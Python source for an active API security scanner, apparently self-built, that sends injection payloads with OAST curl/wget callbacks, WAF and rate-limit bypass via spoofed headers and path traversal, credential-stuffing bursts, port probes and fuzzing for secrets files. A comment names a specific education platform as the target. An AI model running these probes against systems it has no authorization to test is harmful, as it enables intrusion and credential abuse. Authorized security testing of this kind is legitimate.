import requests
import yaml
import re
import time
import base64
import json
import socket
import uuid
import random
from urllib.parse import urlparse, urljoin

def generate_mock_param(path_str):
    """
    Intelligently generates realistic data for path variables.
    Instead of passing '1' to everything, it generates UUIDs for {uuid},
    random integers for {id}, and 'test' for strings.
    """
    def repl(match):
        param_name = match.group(0).strip('{}').lower()
        if 'uuid' in param_name:
            return str(uuid.uuid4())
        elif 'id' in param_name or 'num' in param_name:
            return str(random.randint(1000, 9999))
        return "test_mock_value"
    
    return re.sub(r'\{.*?\}', repl, path_str)

# ==============================================================================
# PASSIVE SCANNER
# ==============================================================================
class APIScanner:
    def __init__(self, spec_content, target_base_url=None):
        self.spec_content = spec_content
        self.target_base_url = target_base_url.rstrip('/') if target_base_url else None
        self.report = {"target": target_base_url or "File Scan", "status": "Failed", "vulnerabilities": [], "endpoints": []}
        self.api_spec = None

    def parse_spec(self):
        try:
            self.api_spec = yaml.safe_load(self.spec_content)
            if isinstance(self.api_spec, dict):
                self.report["status"] = "Success"
                return True
        except Exception as e:
            print(f"[-] Error parsing spec: {e}")
        return False
        
    def check_https(self):
        if not self.target_base_url: return
        if urlparse(self.target_base_url).scheme != 'https':
            self.report["vulnerabilities"].append({"name": "Unencrypted Transport", "severity": "High", "description": "API is available via HTTP. [Violates GDPR Art. 32 / PCI-DSS 4.1]", "cvss": 5.9, "owasp": "API8:2023 Security Misconfiguration"})
    
    def check_auth_definitions(self):
        if not self.api_spec: return
        sec = self.api_spec.get('components', {}).get('securitySchemes', {}) or self.api_spec.get('securityDefinitions', {})
        if not sec:
            self.report["vulnerabilities"].append({"name": "Missing Auth Definitions", "severity": "Medium", "description": "No global security schemes found.", "cvss": 5.3, "owasp": "API2:2023 Broken Authentication"})

    def check_security_headers(self):
        if not self.target_base_url: return
        try:
            headers = requests.get(self.target_base_url, timeout=5).headers
            missing = [h for h in ["X-Content-Type-Options", "X-Frame-Options", "Content-Security-Policy"] if h not in headers]
            if missing:
                self.report["vulnerabilities"].append({"name": "Missing Security Headers", "severity": "Low", "description": f"Missing headers: {', '.join(missing)}", "cvss": 3.1, "owasp": "API8:2023 Security Misconfiguration"})
        except: pass

    def parse_endpoints(self):
        if not self.api_spec: return
        
        base_path = self.api_spec.get('basePath', '')
        if not base_path and 'servers' in self.api_spec and len(self.api_spec['servers']) > 0:
            server_url = self.api_spec['servers'][0].get('url', '')
            parsed = urlparse(server_url)
            base_path = parsed.path
            
        base_path = base_path.rstrip('/')
        
        paths = self.api_spec.get('paths', {})
        for path, methods in paths.items():
            for method in methods:
                if method.lower() in ['get', 'post', 'put', 'delete', 'patch']:
                    full_path = f"{base_path}{path}"
                    self.report["endpoints"].append(f"{method.upper()} {full_path}")

    def run_passive_scan(self):
        # Host-level checks should always run, even without API Spec
        self.check_https()
        self.check_security_headers()
        
        if self.parse_spec():
            self.check_auth_definitions()
            self.parse_endpoints()
            
        return self.report

# ==============================================================================
# ACTIVE SCANNERS
# ==============================================================================
def fetch_swagger_from_url(url):
    try:
        headers = {'User-Agent': 'Mozilla/5.0'}
        response = requests.get(url, headers=headers, timeout=10)
        response.raise_for_status()
        return response.text
    except Exception as e:
        print(f"Error fetching swagger: {e}")
        return None

def _build_url(base_url, path_str):
    clean_base = base_url.rstrip('/')
    clean_path = path_str if path_str.startswith('/') else f"/{path_str}"
    return f"{clean_base}{clean_path}"

def calibrate_baseline(base_url, auth_headers):
    """
    Mathematical Zero-False-Positive calibration. Requests a guaranteed non-existent URL
    to map the firewall's exact 'garbage' signature.
    """
    try:
        url = _build_url(base_url, f"/api/v1/sentinel_garbage_{uuid.uuid4().hex}")
        res = requests.get(url, headers=auth_headers, timeout=3)
        return {
            "status": res.status_code,
            "length": len(res.text),
            "is_json": 'application/json' in res.headers.get('Content-Type', '').lower()
        }
    except:
        return {"status": 404, "length": 0, "is_json": False}

def attempt_waf_bypass(method, path, base_url, auth_headers, baseline):
    """
    Advanced WAF Evasion Engine. Uses Verb Tampering, Path Normalization Evasion,
    and IP Spoofing to break through 401/403 blocks.
    """
    spoof_headers = auth_headers.copy() if auth_headers else {}
    spoof_headers.update({
        "X-Forwarded-For": "127.0.0.1",
        "X-Real-IP": "127.0.0.1",
        "X-Custom-IP-Authorization": "127.0.0.1",
        "X-Original-URL": path,
        "X-Rewrite-URL": path
    })
    
    # Path Normalization Evasion
    # If path is /api/admin -> /api/v1/../admin or //api/./admin
    parts = [p for p in path.split('/') if p]
    if len(parts) >= 2:
        evasion_path = f"/{parts[0]}/v1/../{'/'.join(parts[1:])}"
    else:
        evasion_path = f"//{path.lstrip('/')}"
        
    evasion_url = _build_url(base_url, evasion_path)
    
    # Verb Tampering
    verbs_to_try = ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"]
    verbs_to_try.remove(method.upper())
    
    for verb in verbs_to_try:
        try:
            res = requests.request(verb, evasion_url, headers=spoof_headers, timeout=3)
            
            # Mathematical Differential Check for Bypass
            if res.status_code in [200, 201, 202, 204]:
                if res.status_code != baseline["status"] and abs(len(res.text) - baseline["length"]) > 50:
                    # Confirmed bypass!
                    return {
                        "name": f"WAF Bypass & Auth Bypass ({verb})", 
                        "severity": "Critical", 
                        "description": f"Endpoint {path} was initially blocked (403/401). API Sentinel bypassed the WAF using Path Traversal Evasion ({evasion_path}), IP Spoofing, and Verb Tampering ({verb}).", 
                        "cvss": 9.8, 
                        "owasp": "API2:2023 Broken Authentication"
                    }
        except: pass
        
    return None

def check_broken_authentication(method, path, base_url, logger=None):
    if 'login' in path or 'register' in path or '.well-known' in path or 'auth' in path: return None
    try:
        url = _build_url(base_url, re.sub(r'\{.*?\}', '1', path))
        res = requests.request(method, url, timeout=5)
        # 401 Unauthorized, 403 Forbidden, 404/405 usually indicate it's not implemented or wrong method, not a bypass
        if res.status_code in [200, 201, 202, 204]: 
            # Require JSON response. If it's returning HTML, it's a SPA fallback/redirect, not an API leak.
            content_type = res.headers.get('Content-Type', '').lower()
            if 'application/json' not in content_type and len(res.text) > 0:
                return None
                
            text_lower = res.text.lower()
            pseudo_errors = ["unauthorized", "invalid token", "forbidden", "not logged in", "access denied", "missing token"]
            if not any(err in text_lower for err in pseudo_errors):
                return {"name": "Broken Authentication", "severity": "High", "description": f"Endpoint {method.upper()} {path} permitted unauthenticated access (Status: {res.status_code}). [Violates PCI-DSS Req. 8]", "cvss": 8.8, "owasp": "API2:2023 Broken Authentication"}
    except: pass
    return None

def check_bola_vulnerability(method, path, base_url, auth_headers):
    if '{' not in path: return None
    try:
        url1 = _build_url(base_url, generate_mock_param(path))
        url2 = _build_url(base_url, generate_mock_param(path))
        res1 = requests.request(method, url1, headers=auth_headers, timeout=5)
        res2 = requests.request(method, url2, headers=auth_headers, timeout=5)
        
        if res1.status_code == 200 and res2.status_code == 200 and res1.content != res2.content:
            return {"name": "BOLA / IDOR", "severity": "High", "description": f"Endpoint {path} allows accessing multiple separate object IDs successfully under the same token. [Violates GDPR Art. 32]", "cvss": 8.5, "owasp": "API1:2023 Broken Object Level Authorization"}
    except: pass
    return None

def check_injection(method, path, base_url, auth_headers, oast_url=None):
    if '.well-known' in path: return None
    
    from .payload_generator import PayloadGenerator
    payloads = {
        "SQLi": PayloadGenerator.get_sqli_payloads(),
        "XSS": PayloadGenerator.get_xss_payloads(),
        "CmdInj": PayloadGenerator.get_cmd_injection_payloads(),
        "NoSQLi": PayloadGenerator.get_nosql_payloads()
    }
    
    if oast_url:
        payloads["CmdInj"].extend([f"curl {oast_url}", f"wget {oast_url}", f"ping -c 1 {oast_url}"])

    db_errors = ["sql ", "mysql", "syntax", "ora-", "postgresql", "unexpected token", "pg_query", "mongo", "bson"]
    
    for inj_type, p_list in payloads.items():
        for p in p_list:
            try:
                if method in ['post', 'put', 'patch']:
                    url = _build_url(base_url, path)
                    
                    if inj_type == "NoSQLi":
                        # NoSQL injections usually target JSON bodies directly
                        json_payload = {"email": p, "password": p, "username": p, "id": p}
                    else:
                        # Context-Aware Mutation: For ID fields, inject numeric-aware payloads
                        int_payload = f"1 OR 1=1" if inj_type == "SQLi" else p
                        json_payload = {"email": p, "password": p, "username": p, "id": int_payload, "account_id": int_payload, "search": p, "q": p, "query": p}
                        
                    res = requests.request(method, url, json=json_payload, headers=auth_headers, timeout=3)
                else:
                    if inj_type == "NoSQLi":
                        continue # Skip NoSQLi for GET requests as they are usually JSON body based
                    # Context-Aware Mutation for GET queries
                    int_payload = f"1 OR 1=1" if inj_type == "SQLi" else p
                    url = _build_url(base_url, f"{generate_mock_param(path)}?q={p}&id={int_payload}&search={p}")
                    res = requests.request(method, url, headers=auth_headers, timeout=3)
                    
                text_lower = res.text.lower()
                
                if inj_type == "SQLi":
                    if res.status_code == 500 and any(err in text_lower for err in db_errors):
                        return {"name": "SQL Injection (Error-Based)", "severity": "Critical", "description": f"Endpoint {path} triggered DB errors with payload '{p}'. [Violates PCI-DSS Req. 6.5.1]", "cvss": 9.8, "owasp": "API8:2023 Security Misconfiguration"}
                    if res.status_code == 200 and 'token' in text_lower and 'error' not in text_lower:
                        return {"name": "SQL Injection (Auth Bypass)", "severity": "Critical", "description": f"Endpoint {path} bypassed auth / logic with payload '{p}'.", "cvss": 9.8, "owasp": "API8:2023 Security Misconfiguration"}
                        
                elif inj_type == "NoSQLi":
                    if res.status_code == 500 and any(err in text_lower for err in db_errors):
                        return {"name": "NoSQL Injection", "severity": "Critical", "description": f"Endpoint {path} threw NoSQL errors with payload '{p}'.", "cvss": 9.8, "owasp": "API8:2023 Security Misconfiguration"}
                    if res.status_code == 200 and ('token' in text_lower or len(res.content) > 1000): # Assuming massive data dump
                        return {"name": "NoSQL Injection (Auth/Data Bypass)", "severity": "Critical", "description": f"Endpoint {path} bypassed logic with NoSQL payload '{p}'.", "cvss": 9.8, "owasp": "API8:2023 Security Misconfiguration"}
                        
                elif inj_type == "XSS":
                    if res.status_code == 200 and str(p) in res.text:
                        return {"name": "Reflected Cross-Site Scripting (XSS)", "severity": "Medium", "description": f"Endpoint {path} reflected unsafe script payload.", "cvss": 6.1, "owasp": "API8:2023 Security Misconfiguration"}
                        
                elif inj_type == "CmdInj":
                    if "uid=" in text_lower or "root:" in text_lower or ("127.0.0.1" in text_lower and "ping" not in str(p)):
                        return {"name": "OS Command Injection", "severity": "Critical", "description": f"Endpoint {path} executed system command '{p}'.", "cvss": 10.0, "owasp": "API8:2023 Security Misconfiguration"}
            except requests.exceptions.ReadTimeout:
                if inj_type in ["SQLi", "CmdInj", "NoSQLi"] and ("sleep" in str(p).lower() or "delay" in str(p).lower() or "ping" in str(p).lower()):
                    return {"name": f"Time-based Blind {inj_type}", "severity": "Critical", "description": f"Endpoint {path} timed out (likely executed) after receiving payload '{p}'.", "cvss": 9.8, "owasp": "API8:2023 Security Misconfiguration"}
            except: pass
    return None

def check_ssrf(method, path, base_url, auth_headers, oast_url=None):
    """
    Checks for Server-Side Request Forgery by feeding internal URLs into common parameter names.
    """
    from .payload_generator import PayloadGenerator
    payloads = PayloadGenerator.get_ssrf_payloads()
    if oast_url:
        payloads.append(oast_url)
    
    # Common parameters that might be vulnerable to SSRF
    ssrf_params = ["url", "uri", "endpoint", "path", "target", "domain", "webhook", "callback"]
    
    for p in payloads:
        try:
            if method in ['post', 'put', 'patch']:
                url = _build_url(base_url, path)
                json_payload = {param: p for param in ssrf_params}
                res = requests.request(method, url, json=json_payload, headers=auth_headers, timeout=3)
            else:
                query_string = "&".join([f"{param}={p}" for param in ssrf_params])
                url = _build_url(base_url, f"{generate_mock_param(path)}?{query_string}")
                res = requests.request(method, url, headers=auth_headers, timeout=3)
                
            text_lower = res.text.lower()
            
            # If the response contains metadata patterns or default web server pages
            if "ami-id" in text_lower or "instance-action" in text_lower or "compute.internal" in text_lower:
                return {"name": "Server-Side Request Forgery (Cloud Metadata)", "severity": "Critical", "description": f"Endpoint {path} fetched cloud metadata using payload '{p}'. [Violates SSRF mitigations]", "cvss": 9.5, "owasp": "API10:2023 Unsafe Consumption of APIs"}
            
            # If we hit an internal network that was previously unreachable and we see unique signatures
            if "localhost" not in base_url and ("ubuntu" in text_lower or "debian" in text_lower or "apache" in text_lower) and res.status_code == 200:
                 return {"name": "Server-Side Request Forgery (Internal Access)", "severity": "High", "description": f"Endpoint {path} seems to have fetched an internal page using '{p}'.", "cvss": 8.0, "owasp": "API10:2023 Unsafe Consumption of APIs"}

        except: pass
    return None

def check_rate_limit(method, path, base_url, auth_headers):
    # Only check state-changing methods or authentication-related GET requests to reduce false positives
    if method == 'get' and not any(kw in path.lower() for kw in ['login', 'auth', 'register', 'token']):
        return None
        
    try:
        url = _build_url(base_url, re.sub(r'\{.*?\}', '1', path))
        
        # Pre-flight check: only blast endpoints that actually exist
        preflight_res = requests.request(method, url, headers=auth_headers, timeout=3)
        if preflight_res.status_code in [404, 405]: 
            return None
            
        requests_sent = 1
        for _ in range(49):
            res = requests.request(method, url, headers=auth_headers, timeout=2)
            requests_sent += 1
            if res.status_code == 429: return None # Properly rate limited
            
            # If server crashes or blocks us entirely via firewall rules
            if res.status_code in [500, 502, 503, 403]: return None 
            
        return {"name": "Missing Rate Limiting", "severity": "Medium", "description": f"Endpoint allowed {requests_sent} rapid burst requests (Status {preflight_res.status_code}) without throwing a 429 Too Many Requests. [Violates SOC 2 CC6]", "cvss": 5.3, "owasp": "API4:2023 Unrestricted Resource Consumption"}
    except: pass
    return None

def check_sensitive_data(method, path, base_url, auth_headers):
    if method != 'get': return None
    patterns = {
        "Email Exposure": r'[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+', 
        "SSN Exposure": r'\b\d{3}-\d{2}-\d{4}\b',
        "Credit Card (Visa/MC)": r'\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14})\b',
        "IP Address Leak": r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
    }
    try:
        url = _build_url(base_url, re.sub(r'\{.*?\}', '1', path))
        res = requests.get(url, headers=auth_headers, timeout=5)
        found = [k for k, v in patterns.items() if re.search(v, res.text)]
        if "IP Address Leak" in found and ("127.0.0.1" in res.text or "172." in res.text):
            found.remove("IP Address Leak")
            
        if found: return {"name": "Excessive Data / PI Exposure", "severity": "High", "description": f"Endpoint leaked patterned data: {', '.join(found)}. [Violates GDPR Art. 5]", "cvss": 7.5, "owasp": "API3:2023 Broken Object Property Level Auth"}
    except: pass
    return None

def check_mass_assignment(method, path, base_url, auth_headers):
    if method not in ['post', 'put', 'patch']: return None
    payloads = [
        {"isAdmin": True, "role": "admin", "permissions": "all"},
        {"is_admin": 1, "account_type": "premium"},
        {"user": {"role": "admin", "privilege": 999}}
    ]
    try:
        url = _build_url(base_url, generate_mock_param(path))
        for payload in payloads:
            res = requests.request(method, url, json=payload, headers=auth_headers, timeout=5)
            if res.status_code in [200, 201, 202] and ("admin" in res.text.lower() or "premium" in res.text.lower()):
                return {"name": "Potential Mass Assignment", "severity": "Medium", "description": f"Endpoint {method.upper()} {path} accepted a privileged payload and reflected successful state change.", "cvss": 6.5, "owasp": "API3:2023 Broken Object Property Level Auth"}
    except: pass
    return None

def check_hidden_parameters(method, path, base_url, auth_headers):
    """
    Fuzzes for hidden parameters like ?admin=true, ?debug=1 that could lead to BOLA or Mass Assignment.
    """
    if method != 'get': return None
    hidden_params = ['admin=true', 'debug=1', 'test=1', 'role=admin', 'user_id=1', 'id=1']
    try:
        url_base = _build_url(base_url, generate_mock_param(path))
        baseline_res = requests.get(url_base, headers=auth_headers, timeout=5)
        baseline_len = len(baseline_res.text)
        baseline_status = baseline_res.status_code

        for param in hidden_params:
            url_fuzz = f"{url_base}?{param}" if '?' not in url_base else f"{url_base}&{param}"
            fuzz_res = requests.get(url_fuzz, headers=auth_headers, timeout=5)
            
            if fuzz_res.status_code == 200 and baseline_status != 200 and fuzz_res.status_code not in [404, 400]:
                return {"name": "Hidden Parameter Discovered (Bypass)", "severity": "High", "description": f"Endpoint {path} reacted to hidden parameter '{param}', changing status from {baseline_status} to 200.", "cvss": 7.5, "owasp": "API3:2023 Broken Object Property Level Auth"}
            
            if fuzz_res.status_code == baseline_status == 200:
                length_diff = abs(len(fuzz_res.text) - baseline_len)
                if length_diff > 100: # Significant change in response payload
                    return {"name": "Hidden Parameter Discovered (Mass Assignment / Data Exposure)", "severity": "Medium", "description": f"Endpoint {path} returned significantly different data when '{param}' was injected.", "cvss": 6.5, "owasp": "API3:2023 Broken Object Property Level Auth"}
    except: pass
    return None

def check_unsafe_methods(path, base_url):
    try:
        url = _build_url(base_url, path)
        for method in ["TRACE", "TRACK", "DEBUG"]:
            res = requests.request(method, url, timeout=5)
            if res.status_code == 200 and ("Via" in res.headers or "TRACE" in res.text or method in res.text):
                return {"name": f"Unsafe HTTP Method ({method})", "severity": "Low", "description": f"Server actively enabled {method} method on {path}.", "cvss": 3.7, "owasp": "API8:2023 Security Misconfiguration"}
    except: pass
    return None

def check_jwt_weakness(auth_header):
    if not auth_header or "Bearer " not in auth_header: return None
    try:
        token = auth_header.split(" ")[1]
        if "." not in token: return None
        header_segment = token.split(".")[0]
        padded = header_segment + '=' * (-len(header_segment) % 4)
        header_data = json.loads(base64.urlsafe_b64decode(padded))
        
        if header_data.get('alg', '').lower() == 'none':
            return {"name": "Insecure JWT (None Alg)", "severity": "Critical", "description": "JWT allows 'None' algorithm.", "cvss": 9.8, "owasp": "API2:2023 Broken Authentication"}
        if header_data.get('alg', '').upper() == 'HS256':
            return {"name": "Weak JWT Key (HS256)", "severity": "Low", "description": "JWT uses symmetric HS256 key.", "cvss": 4.8, "owasp": "API2:2023 Broken Authentication"}
    except: pass
    return None

def check_debug_endpoints(base_url):
    paths = [
        # Admin / Auth
        '/admin', '/api/admin', '/login', '/api/login', '/auth', '/administrator',
        # Configs / Secrets
        '/.env', '/.env.backup', '/config.json', '/appsettings.json', '/docker-compose.yml',
        # Source Control
        '/.git/config',
        # API Schemas (Very Valuable!)
        '/swagger.json', '/openapi.json', '/api-docs', '/v2/api-docs', '/v3/api-docs', '/docs', '/graphql', '/graphiql',
        # DevOps / Actuators
        '/metrics', '/health', '/actuator/health', '/actuator/env', '/server-status', '/phpinfo.php',
        # Backups
        '/backup.zip', '/dump.sql'
    ]
    clean_base = base_url.rstrip('/')
    for p in paths:
        try:
            url = f"{clean_base}{p}"
            res = requests.get(url, timeout=3)
            if res.status_code == 200:
                html_lower = res.text.lower()
                is_login = False
                if "<form" in html_lower and "type=\"password\"" in html_lower:
                    is_login = True
                elif "keycloak administration" in html_lower or "title>login" in html_lower or "sign-in" in html_lower:
                    is_login = True
                
                if is_login:
                    return {"name": "Exposed Login Portal", "severity": "Low", "description": f"Login page or Auth SPA accessible at {p}.", "cvss": 3.0, "owasp": "API9:2023 Improper Inventory Management"}
                
                sensitive_keywords = ["admin dashboard", "configuration", "wp-admin", "django administration", "phpmyadmin", "swagger ui", "openapi"]
                content_type = res.headers.get('Content-Type', '').lower()
                
                if any(kw in html_lower for kw in sensitive_keywords) or 'application/json' in content_type:
                    return {"name": "Exposed Sensitive Path", "severity": "Medium", "description": f"Path {p} is accessible and contains sensitive data or API schema.", "cvss": 5.8, "owasp": "API9:2023 Improper Inventory Management"}
        except: pass
    return None

def check_open_ports(base_url):
    open_ports = []
    try:
        host = urlparse(base_url).hostname
        if not host: return None
        ports_to_check = {22: "SSH", 3306: "MySQL", 5432: "PostgreSQL", 27017: "MongoDB", 6379: "Redis"}
        for port, service in ports_to_check.items():
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(0.5)
                if s.connect_ex((host, port)) == 0:
                    open_ports.append(f"{port} ({service})")
        if open_ports:
            return {"name": "Exposed Infrastructure Services", "severity": "High", "description": f"The following sensitive ports are publicly exposed: {', '.join(open_ports)}. [Violates NIST SP 800-53]", "cvss": 7.5, "owasp": "API8:2023 Security Misconfiguration"}
    except: pass
    return None

def check_cors_policy(base_url):
    try:
        clean_base = base_url.rstrip('/')
        headers = {'Origin': 'https://evil-attacker.com'}
        # Active CORS checking
        res = requests.options(clean_base, headers=headers, timeout=5)
        acao = res.headers.get('Access-Control-Allow-Origin', '')
        if acao == '*' or acao == 'https://evil-attacker.com':
            return {"name": "Insecure CORS Policy (Dynamic)", "severity": "Medium", "description": f"The server explicitly allowed cross-origin requests from an untrusted origin: Access-Control-Allow-Origin: {acao}", "cvss": 6.5, "owasp": "API8:2023 Security Misconfiguration"}
    except: pass
    return None

def find_hidden_api_endpoints(base_url, auth_headers=None, baseline=None, logger=None):
    found_vulns = []
    found_endpoints = []
    clean_base = base_url.rstrip('/')
    
    def log(msg):
        if logger: logger(msg)

    # 1. Robots.txt / Sitemap Recon
    try:
        robots_res = requests.get(f"{clean_base}/robots.txt", timeout=3)
        if robots_res.status_code == 200:
            disallowed = re.findall(r'Disallow:\s*(/.*)', robots_res.text)
            for d in disallowed:
                if 'api' in d.lower():
                    found_vulns.append({"name": "Hidden API Discovered (Recon)", "severity": "Medium", "description": f"Robots.txt leaks hidden API path: {d}. [Violates NIST SP 800-53 CM-8]", "cvss": 5.0, "owasp": "API9:2023 Improper Inventory Management"})
                    found_endpoints.append(f"GET {d}")
    except: pass

    # 2. Extract from Javascript files (Crawling frontend SPA)
    try:
        root_res = requests.get(clean_base, timeout=5)
        scripts = re.findall(r'<script\s+[^>]*src=["\']([^"\']+)["\']', root_res.text)
        for script in scripts[:5]:  # Analyze top 5 JS bundles
            s_url = script if script.startswith('http') else f"{clean_base}/{script.lstrip('/')}"
            try:
                s_res = requests.get(s_url, timeout=3)
                if s_res.status_code == 200:
                    api_paths = set(re.findall(r'["\'](/api/(?:v[1-3]/)?[a-zA-Z0-9_\-/]+)["\']', s_res.text))
                    for ap in api_paths:
                        found_endpoints.append(f"GET {ap}")
                        found_endpoints.append(f"POST {ap}")
            except: pass
    except: pass

    # 3. Enhanced API Fuzzing Dictionary (Massive Enterprise Wordlist)
    fuzz_paths = [
        # Base Paths
        '/api', '/api/v1', '/api/v2', '/api/v3', '/v1', '/v2', '/v3', '/graphql', '/graph', '/api/graphql',
        
        # Authentication & Authorization
        '/auth', '/auth/login', '/auth/register', '/auth/token', '/auth/refresh', '/auth/logout',
        '/api/auth/login', '/api/auth/register', '/api/v1/auth', '/login', '/register', '/oauth/token',
        '/oauth2/token', '/sso/login', '/jwt/token', '/jwt/refresh', '/api/token',
        
        # OpenID & Configs
        '/.well-known/openid-configuration', '/.well-known/jwks.json', '/realms/master/.well-known/openid-configuration',
        '/swagger.json', '/api-docs', '/v2/api-docs', '/v3/api-docs', '/openapi.json', '/docs', '/api/docs',
        '/swagger-ui.html', '/config', '/api/config', '/env', '/.env', '/actuator/env',
        
        # Admin & Dev
        '/admin', '/api/admin', '/admin/login', '/admin/users', '/admin/dashboard', '/api/v1/admin',
        '/dev', '/api/dev', '/beta', '/test', '/api/test', '/debug', '/api/debug',
        '/actuator', '/actuator/health', '/health', '/healthcheck', '/ping', '/metrics', '/actuator/metrics',
        
        # Users & Accounts
        '/users', '/api/users', '/api/v1/users', '/api/v2/users', '/user', '/api/user',
        '/users/me', '/api/users/me', '/profile', '/api/profile', '/account', '/api/account',
        '/customers', '/api/customers', '/employees', '/api/employees', '/members', '/staff',
        
        # E-commerce / General Objects
        '/products', '/api/products', '/orders', '/api/orders', '/cart', '/api/cart',
        '/payments', '/api/payments', '/invoices', '/transactions', '/billing',
        '/items', '/files', '/uploads', '/images', '/documents', '/data',
        
        # Education / specific (since target is mysecondteacher)
        '/students', '/api/students', '/teachers', '/api/teachers', '/courses', '/api/courses',
        '/classes', '/lessons', '/exams', '/grades', '/marks', '/assignments', '/school',
        
        # Common bypass variations
        '/api/private/users', '/api/internal/users', '/internal/api', '/private/api',
        '/v1.1', '/v1.2', '/api/v1.1', '/api/v1.0'
    ]
    
    to_fuzz = list(set([p.split(" ")[1] if " " in p else p for p in found_endpoints] + fuzz_paths))
    
    for p in to_fuzz:
        try:
            res = requests.get(f"{clean_base}{p}", headers=auth_headers, timeout=2)
            is_json = 'application/json' in res.headers.get('Content-Type', '').lower()
            
            # Reachable API
            if res.status_code in [200, 201, 202, 204] and is_json:
                if p in fuzz_paths: # It was found purely by fuzzing
                    found_vulns.append({"name": "Undocumented API Found", "severity": "Low", "description": f"Discovered reachable endpoint {p}.", "cvss": 3.0, "owasp": "API9:2023 Improper Inventory Management"})
                found_endpoints.append(f"GET {p}")
                found_endpoints.append(f"POST {p}")
                
            # Blocked / Unreachable API
            elif res.status_code in [401, 403, 405]:
                # Mathematical Differential Check
                if baseline and res.status_code != baseline["status"] and abs(len(res.text) - baseline["length"]) > 50:
                    # It's a real, distinct blocked endpoint!
                    
                    # 1. Attempt to Break In (Advanced WAF Bypass)
                    bypass_vuln = attempt_waf_bypass('GET', p, base_url, auth_headers, baseline)
                    if bypass_vuln:
                        found_vulns.append(bypass_vuln)
                        found_endpoints.append(f"GET {p}") # Map as normal (since we broke in)
                    else:
                        # 2. Failed to break in -> Map as Unreachable Grey Node
                        found_endpoints.append(f"GET {p} (Unreachable)")
                        
                elif is_json:
                    # Traditional fallback
                    found_endpoints.append(f"GET {p} (Unreachable)")
                    
        except: pass
        
    # GraphQL Introspection Check
    graphql_paths = [p for p in found_endpoints if 'graphql' in p.lower()]
    for gp in graphql_paths:
        try:
            url = f"{clean_base}{gp.split(' ')[1]}"
            introspection_query = {"query": "{ __schema { types { name fields { name } } } }"}
            res = requests.post(url, json=introspection_query, timeout=4)
            if res.status_code == 200 and 'data' in res.text and '__schema' in res.text:
                found_vulns.append({"name": "GraphQL Introspection Enabled", "severity": "High", "description": f"Endpoint {gp.split(' ')[1]} allows unauthenticated schema introspection, leaking the entire database architecture. [Violates API9:2023]", "cvss": 7.3, "owasp": "API9:2023 Improper Inventory Management"})
        except: pass
        
    if found_endpoints:
        log(f"     [+] Recon Engine discovered {len(set(found_endpoints))} potential endpoints dynamically.")
        
    return found_vulns, list(set(found_endpoints))

def perform_automated_login(login_url, username, password, auth_type='jwt', logger=None):
    """
    Enterprise Multi-Auth Extractor.
    Automatically logs into a target and extracts JWTs, OAuth2 tokens, or Session Cookies.
    """
    def log(msg):
        if logger: logger(msg)
        
    log(f"[*] Auth Crawler: Attempting automated login against {login_url}...")
    
    # IP Spoofing to bypass basic login rate limiters
    headers = {
        "X-Forwarded-For": "127.0.0.1",
        "Content-Type": "application/json"
    }
    
    payload = {"username": username, "password": password}
    if auth_type == 'oauth2':
        payload = {"client_id": username, "client_secret": password, "grant_type": "client_credentials"}
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        
    try:
        if auth_type == 'oauth2':
            res = requests.post(login_url, data=payload, headers=headers, timeout=5)
        else:
            res = requests.post(login_url, json=payload, headers=headers, timeout=5)
            
        if res.status_code not in [200, 201]:
            log(f"[-] Auth Crawler: Login failed with status {res.status_code}")
            return None
            
        # 1. Cookie Extraction
        if auth_type == 'cookie':
            if res.cookies:
                cookie_str = "; ".join([f"{k}={v}" for k, v in res.cookies.items()])
                log("[+] Auth Crawler: Successfully extracted Session Cookie.")
                return {"Cookie": cookie_str}
            else:
                log("[-] Auth Crawler: No cookies returned by server.")
                return None
                
        # 2. JWT / Token Extraction
        data = res.json()
        token = data.get("access_token") or data.get("token") or data.get("jwt")
        if token:
            log("[+] Auth Crawler: Successfully extracted JWT/Access Token.")
            return {"Authorization": f"Bearer {token}"}
        else:
            log("[-] Auth Crawler: Could not find token in JSON response.")
            return None
            
    except Exception as e:
        log(f"[-] Auth Crawler Error: {e}")
        return None

def check_credential_stuffing(login_url, logger=None):
    """
    Fires rapid requests with bad credentials to see if the server lacks rate limiting on the auth endpoint.
    """
    def log(msg):
        if logger: logger(msg)
        
    log(f"[*] Auth Crawler: Running Credential Stuffing & Brute Force check...")
    import concurrent.futures
    
    def send_bad_login(i):
        try:
            requests.post(login_url, json={"username": f"admin{i}", "password": "password123"}, timeout=2)
            return True
        except:
            return False
            
    success_count = 0
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        results = list(executor.map(send_bad_login, range(20)))
        success_count = sum(results)
        
    # Send one more after the barrage to see if we are blocked
    try:
        res = requests.post(login_url, json={"username": "test", "password": "123"}, timeout=2)
        if res.status_code == 429:
            log("[+] Auth Crawler: Rate Limit detected on login. Safe.")
            return None
        elif res.status_code in [401, 403]:
            # Still returning auth errors = No rate limit
            log("[!] Auth Crawler: Server failed to block Brute Force attack.")
            return {
                "name": "Credential Stuffing / Brute Force Vulnerability", 
                "severity": "High", 
                "description": f"Login endpoint {login_url} lacks rate limiting. API Sentinel successfully fired 20 rapid login requests without being blocked (Status: {res.status_code}). [Violates API4:2023]", 
                "cvss": 7.5, 
                "owasp": "API4:2023 Unrestricted Resource Consumption"
            }
    except: pass
    return None

# ==============================================================================
# MASTER SCAN FUNCTION (UPDATED)
# ==============================================================================
def start_scan(spec_content, base_url, auth_headers, scan_options=None, logger=None, report_id=None):
    def log(msg):
        print(msg)
        if logger: logger(msg)

    if scan_options is None:
        scan_options = {'bola': True, 'auth': True, 'injection': True, 'ratelimit': True, 'jwt': True, 'debug': True}

    log(f"[*] Initializing scan for: {base_url}")
    
    passive_scanner = APIScanner(spec_content=spec_content, target_base_url=base_url)
    report = passive_scanner.run_passive_scan()
    
    oast_token = None
    oast_url = None
    if report_id:
        oast_token = f"TKN-{report_id}-{uuid.uuid4().hex[:8]}"
        # Assuming local dev environment for now; in prod this would be your ngrok/public domain
        oast_url = f"http://127.0.0.1:8000/api/oast/catch/{oast_token}/"
        log(f"[*] Generated OAST Token: {oast_token}")
    
    if report['status'] == 'Failed':
        log("[!] Warning: Could not parse OpenAPI spec. Proceeding with Host-Level checks.")
        endpoints = []
    else:
        endpoints = report.get("endpoints", [])
